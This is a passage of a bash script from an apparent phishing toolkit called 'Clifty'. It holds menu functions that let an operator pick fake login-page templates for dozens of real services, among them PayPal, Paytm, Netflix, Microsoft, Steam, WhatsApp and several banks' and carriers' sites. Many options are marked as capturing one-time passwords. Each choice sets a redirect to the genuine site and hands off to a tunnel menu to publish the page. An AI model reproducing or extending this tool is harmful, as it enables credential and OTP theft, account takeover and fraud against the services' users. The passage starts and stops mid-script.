echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} SIM ${NC}"
echo -e "${BLUE}[02]${CYAN} Offer ${NC}"
echo -e "${BLUE}[03]${CYAN} Router - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Router - WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="jiosim"
                sitype="Sim"
                ipname="jiosim"
                tunnelmenu;;
        2 | 02)
                website="jiooffer"
                sitype="Offer"
                dgfname="jiooffer"
                tunnelmenu;;
        3 | 03)
                website="jiorouter"
                rdurl="www.jio.com/business/jiofi"
                sitype="Default"
                tunnelmenu;;
        4 | 04)
                website="jiorouter/otp"
                rdurl="www.jio.com/business/jiofi"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_jio; };;
esac
}
#linkedin
site_linkedin(){
siname="Linkedin"
dgfname="linkedin"
rdurl="linkedin.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="linkedin"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="linkedin/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_linkedin; };;
esac
}
#mediafire
site_mediafire(){
siname="Medifire"
dgfname="mediafire"
rdurl="www.mediafire.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="mediafire"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="mediafire/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_mediafire; };;
esac
}
#messenger
site_messenger(){
siname="Messenger"
rdurl="www.messenger.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} Messenger - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Messenger old - WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="messenger"
                sitype="Default"
                dgfname="messenger"
                tunnelmenu;;
        2 | 02)
                website="messenger/otp"
                sitype="OTP"
                dgfname="messenger"
                tunnelmenu;;
        3 | 03)
                website="messenger_old"
                sitype="Old"
                dgfname="messenger_old"
                tunnelmenu;;
        4 | 04)
                website="messenger_old/otp"
                sitype="Old/OTP"
                dgfname="messenger_old"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_messenger; };;
esac
}
#microsoft
site_microsoft(){
siname="Microsoft"
dgfname="microsoft"
rdurl="www.microsoft.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="microsoft"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="microsoft/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_microsoft; };;
esac
}
#mobiwik
site_mobiwik(){
website="mobiwik"
rdurl="www.mobikwik.com/"
siname="Mobiwik"
dgfname="mobiwik"
sitype="Default"
tunnelmenu
}
#myspace
site_myspace(){
siname="MySpace"
dgfname="myspace"
rdurl="myspace.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="myspace"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="myspace/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_myspace; };;
esac
}
#netflix
site_netflix(){
siname="Netflix"
dgfname="netflix"
rdurl="www.netflix.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="netflix"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="netflix/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_netflix; };;
esac
}
#ola
site_ola(){
website="ola"
rdurl="www.olacabs.com/"
siname="OLA"
dgfname="ola"
sitype="Default"
tunnelmenu
}
#origin
site_origin(){
website="origin"
rdurl="origin.onl"
siname="Origin"
dgfname="origin"
sitype="Default"
tunnelmenu
}
#paypal
site_paypal(){
siname="Paypal"
dgfname="paypal"
rdurl="www.paypal.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="paypal"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="paypal/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_paypal; };;
esac
}
#paytm
site_paytm(){
siname="Paytm"
rdurl="paytm.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} Paytm - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Paytm Offer - WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="paytm"
                sitype="Default"
                dgfname="paytm"
                tunnelmenu;;
        2 | 02)
                website="paytm/otp"
                sitype="OTP"
                dgfname="paytm"
                tunnelmenu;;
        3 | 03)
                website="paytmoffer"
                sitype="Offer"
                dgfname="paytmoffer"
                tunnelmenu;;
        4 | 04)
                website="paytmoffer/otp"
                sitype="Offer/OTP"
                dgfname="paytmoffer"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_paytm; };;
esac
}
#phonepe
site_phonepe(){
website="phonepe"
rdurl="www.phonepe.com/"
siname="phonepe"
dgfname="phonepay"
sitype="Default"
tunnelmenu
}
#origin
site_pinterest(){
website="pinterest"
rdurl="pinterest.com/"
siname="Pinterest"
dgfname="pinterest"
sitype="Default"
tunnelmenu
}
#playstation
site_playstation(){
siname="PlayStation"
rdurl="www.playstation.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="playstation"
                sitype="Default"
                dgfname="playstation"
                tunnelmenu;;
        2 | 02)
                website="playstation/otp"
                sitype="OTP"
                dgfname="playstation"
                tunnelmenu;;
        3 | 03)
                website="playstation2"
                sitype="2"
                dgfname="playstation2"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_playstation; };;
esac
}
#protonmail
site_protonmail(){
siname="Proton Mail"
dgfname="protonmail"
rdurl="proton.me/"
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="protonmail"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="protonmail/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_protonmail; };;
esac
}
#pubg
site_pubg(){
website="pubg"
rdurl="www.pubgmobile.com/"
siname="PUBG"
dgfname="pubg"
sitype="Old"
tunnelmenu
}
#quora
site_quora(){
website="quora"
dgfname="quora"
rdurl="www.quora.com/"
siname="Quora"
sitype="Default"
tunnelmenu
}
#reddit
site_reddit(){
siname="Reddit"
rdurl="www.reddit.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="reddit"
                sitype="Default"
                dgfname="reddit"
                tunnelmenu;;
        2 | 02)
                website="reddit_old"
                sitype="Old"
                dgfname="reddit_old"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_reddit; };;
esac
}
#shopify
site_shopify(){
siname="Shopify"
dgfname="shopify"
rdurl="www.shopify.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="shopify"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="shopify/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_shopify; };;
esac
}
#snapchat
site_snapchat(){
siname="Snapchat"
dgfname="snapchat"
rdurl="www.snapchat.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="snapchat"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="snapchat/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_snapchat; };;
esac
}
#socialclub
site_socialclub(){
siname="SocialClub"
dgfname="socialclub"
rdurl="socialclub.rockstargames.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="socialclub"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="socialclub/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_socialclub; };;
esac
}
#spotify
site_spotify(){
siname="Spotify"
dgfname="spotify"
rdurl="www.spotify.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="spotify"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="spotify/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_spotify; };;
esac
}
#stackoverflow
site_stackoverflow(){
siname="Stackoverflow"
dgfname="stackoverflow"
rdurl="stackoverflow.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="stackoverflow"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="stackoverflow/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_stackoverflow; };;
esac
}
#steam
site_steam(){
siname="Steam"
dgfname="steam"
rdurl="store.steampowered.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="steam"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="steam/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_steam; };;
esac
}
#subitoit
site_subitoit(){
website="subitoit"
rdurl="www.subito.it/"
siname="Subitoit"
dgfname="subitoit"
sitype="Default"
tunnelmenu
}
#telegram
site_telegram(){
website="telegram"
rdurl="telegram.org/"
siname="Telegram"
dgfname="telegram"
sitype="Default"
tunnelmenu
}
#telenor
site_telenor(){
website="telenor"
rdurl="www.telenor.com/"
siname="Telenor"
dgfname="telenor"
sitype="Default"
tunnelmenu
}
#tiktok
site_tiktok(){
siname="TikTok"
rdurl="www.tiktok.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="tiktok"
                sitype="Default"
                dgfname="tiktok"
                tunnelmenu;;
        2 | 02)
                website="tiktok_likes"
                sitype="Likes"
                dgfname="tiktok_likes"
                tunnelmenu;;
        3 | 03)
                website="tiktok_likes/otp"
                sitype="Likes/OTP"
                dgfname="tiktok_likes"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_tiktok; };;
esac
}
#twitch
site_twitch(){
siname="Twitch"
rdurl="www.twitch.tv/"
echo -e "${BLUE}[01]${CYAN} Twitch - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="twitch"
                sitype="Default"
                dgfname="twitch"
                tunnelmenu;;
        2 | 02)
                website="twitch/otp"
                sitype="OTP"
                dgfname="twitch"
                tunnelmenu;;
        3 | 03)
                website="twitch_new"
                sitype="New"
                dgfname="twitch_new"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_twitch; };;
esac
}
#twitter
site_twitter(){
siname="Twitter"
dgfname="twitter"
rdurl="twitter.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="twitter"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="twitter/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_twitter; };;
esac
}
#ubereats
site_ubereats(){
siname="ubereats"
dgfname="ubereats"
rdurl="www.ubereats.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="ubereats"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="ubereats/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_ubereats; };;
esac
}
#verizon
site_verizon(){
siname="Verizon"
dgfname="verizon"
rdurl="www.verizon.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="verizon"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="verizon/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_verizon; };;
esac
}
#visim
site_visim(){
website="visim"
rdurl="www.myvi.in/"
siname="VI sim"
dgfname="visim"
sitype="Default"
tunnelmenu
}
#vk
site_vk(){
siname="VK"
rdurl="vk.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="vk"
                sitype="Default"
                dgfname="vk"
                tunnelmenu;;
        2 | 02)
                website="vk/otp"
                sitype="OTP"
                dgfname="vk"
                tunnelmenu;;
        3 | 03)
                website="vk_poll"
                sitype="Poll"
                dgfname="vk_poll"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_vk; };;
esac
}
#whatsapp
site_whatsapp(){
website="whatsapp"
rdurl="www.web.whatsapp.com"
siname="WhatsApp"
dgfname="whatsapp"
sitype="Default"
tunnelmenu
}
#wordpress
site_wordpress(){
siname="Wordpress"
dgfname="wordpress"
rdurl="wordpress.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
echo -e ""
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
echo -e ""
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
selected="Clifty/${siname}"
uprompt;read -p "${prompt}" sichoice

case $sichoice in
        1 | 01)
                website="wordpress"
                sitype="Default"
                tunnelmenu;;
        2 | 02)
                website="wordpress/otp"
                sitype="OTP"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_wordpress; };;
esac
}
#xbox
site_xbox(){
siname="Xbox"
dgfname="xbox"
rdurl="www.xbox.com"
{ clear; banner; }
echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
